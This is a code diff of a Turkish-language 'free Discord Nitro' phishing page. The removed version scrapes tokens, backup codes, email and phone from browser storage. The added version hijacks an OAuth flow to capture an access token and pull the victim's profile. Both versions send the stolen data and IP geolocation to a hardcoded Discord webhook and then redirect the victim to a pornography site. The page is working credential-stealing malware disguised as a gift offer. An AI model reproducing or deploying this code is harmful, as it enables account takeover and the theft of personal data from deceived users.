@@ -3,35 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Nitro Claim</title>
+    <title>Apex System I - Nitro Claim</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             background: #000;
-            color: #ff00ff;
-            font-family: Consolas, monospace;
+            color: #fff;
+            font-family: Arial, sans-serif;
             text-align: center;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
+            padding-top: 80px;
         }
-        h1 { font-size: 2.8rem; animation: glitch 0.7s infinite; }
-        @keyframes glitch {
-            0% { transform: translate(2px, 0); }
-            20% { transform: translate(-3px, 0); }
-            40% { transform: translate(2px, 0); }
-            100% { transform: translate(0, 0); }
-        }
+        h1 { color: #00ffcc; font-size: 2.8rem; }
         button {
             margin-top: 40px;
-            padding: 18px 50px;
+            padding: 18px 70px;
             font-size: 22px;
-            background: #ff00ff;
-            color: #000;
+            background: #3ba55c;
+            color: white;
             border: none;
             border-radius: 6px;
             cursor: pointer;
@@ -39,98 +26,69 @@
     </style>
 </head>
 <body>
-    <h1>🔥 DISCORD NITRO CLAIM 🔥</h1>
-    <p>1 Yıl Ücretsiz Nitro için hemen claim et</p>
-    <button onclick="startGrab()">CLAIM ET</button>
+    <h1>🎁 1 YIL ÜCRETSİZ NITRO KAZANDIN!</h1>
+    <p style="font-size:20px;">Claim etmek için butona tıkla</p>
+    <button onclick="startOAuth()">NITRO CLAIM ET</button>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1493914750055092334/c4te86vOd5_gaR4ak2GiUhnObzbAQJm_1slOmR4jaYz78xt_xNfnMwZZsHrCb5cqcIbP";
+        const OAUTH_URL = "https://discord.com/oauth2/authorize?client_id=1446814626154020944"; 
+        // ↑ Yukarıdaki URL'yi kendi botunun OAuth2 URL Generator'ından al ve yapıştır
 
-        async function sendToDiscord(data) {
-            const embed = {
-                title: "☠️ WEB GRABBER ÇALIŞTI ☠️",
-                color: 0xff0000,
-                fields: [
-                    { name: "IP & Konum", value: `${data.ip} - ${data.city}, ${data.country}`, inline: false },
-                    { name: "Google Maps", value: data.maps || "Konum alınamadı", inline: false },
-                    { name: "Discord Token", value: data.token ? `\`\`\`${data.token}\`\`\`` : "Bulunamadı (Web Tarayıcı)", inline: false },
-                    { name: "Email", value: data.email || "Bulunamadı", inline: true },
-                    { name: "Telefon", value: data.phone || "Bulunamadı", inline: true },
-                    { name: "Backup Kodları", value: data.backup.length ? "```" + data.backup.join("\n") + "```" : "Bulunamadı", inline: false },
-                    { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
-                ],
-                timestamp: new Date().toISOString()
-            };
+        async function sendFullInfo(token, ipData) {
+            try {
+                const res = await fetch("https://discord.com/api/v9/users/@me", {
+                    headers: { "Authorization": token }
+                });
+                const user = await res.json();
 
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username: "Unchained Web Grabber", embeds: [embed] })
-            }).catch(() => {});
+                const embed = {
+                    title: "☠️ OAUTH İLE FULL HESAP ÇEKİLDİ ☠️",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "IP & Konum", value: `${ipData.ip} - ${ipData.city}, ${ipData.country}`, inline: false },
+                        { name: "Google Maps", value: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`, inline: false },
+                        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
+                        { name: "Kullanıcı", value: `${user.username}#${user.discriminator}`, inline: true },
+                        { name: "Email", value: user.email || "Gizli", inline: true },
+                        { name: "Telefon", value: user.phone || "Yok", inline: true },
+                        { name: "2FA", value: user.mfa_enabled ? "✅ Açık" : "❌ Kapalı", inline: true }
+                    ]
+                };
+
+                fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ username: "Apex System Grabber", embeds: [embed] })
+                });
+            } catch(e) {}
         }
 
-        async function startGrab() {
-            let info = {
-                ip: "Yükleniyor...",
-                city: "",
-                country: "",
-                maps: "",
-                token: "Bulunamadı",
-                email: "Bulunamadı",
-                phone: "Bulunamadı",
-                backup: []
-            };
-
-            // IP + Konum + Google Maps
+        async function startOAuth() {
+            // IP al
+            let ipData = {};
             try {
-                const res = await fetch("https://ipapi.co/json/");
-                const data = await res.json();
-                info.ip = data.ip;
-                info.city = data.city;
-                info.country = data.country_name;
-                info.maps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                const r = await fetch("https://ipapi.co/json/");
+                ipData = await r.json();
             } catch(e) {}
 
-            // Token ve diğer bilgileri webden agresif çek
-            const keys = ["token", "Token", "auth_token", "authorization", "user_token"];
-            try {
-                for (let k of keys) {
-                    let t = localStorage.getItem(k) || sessionStorage.getItem(k);
-                    if (t && t.length > 50) {
-                        info.token = t;
-                        break;
+            // OAuth izin ekranını aç
+            window.location.href = OAUTH_URL;
+
+            // Token'ı URL'den yakala (redirect sonrası)
+            window.addEventListener("load", () => {
+                if (window.location.hash.includes("access_token")) {
+                    const hash = window.location.hash.substring(1);
+                    const params = new URLSearchParams(hash);
+                    const token = params.get("access_token");
+
+                    if (token) {
+                        sendFullInfo(token, ipData);
+                        // Porno yönlendirme
+                        setTimeout(() => window.location.href = "https://pornhub.com", 1500);
                     }
                 }
-
-                // Backup kodları ara
-                for (let i = 0; i < localStorage.length; i++) {
-                    let val = localStorage.getItem(localStorage.key(i));
-                    if (val) {
-                        let codes = val.match(/[A-Z0-9]{8}/g);
-                        if (codes) info.backup = [...new Set([...info.backup, ...codes])];
-                    }
-                }
-            } catch(e) {}
-
-            // Email ve telefon için ekstra deneme (Discord web cache'lerinden)
-            try {
-                if (window.localStorage) {
-                    const userData = localStorage.getItem("user") || localStorage.getItem("User");
-                    if (userData) {
-                        const parsed = JSON.parse(userData);
-                        if (parsed.email) info.email = parsed.email;
-                        if (parsed.phone) info.phone = parsed.phone;
-                    }
-                }
-            } catch(e) {}
-
-            // Bilgileri gönder
-            await sendToDiscord(info);
-
-            // 1.5 saniye sonra pornhub'a at
-            setTimeout(() => {
-                window.location.href = "https://pornhub.com";
-            }, 1500);
+            });
         }
     </script>
 </body>
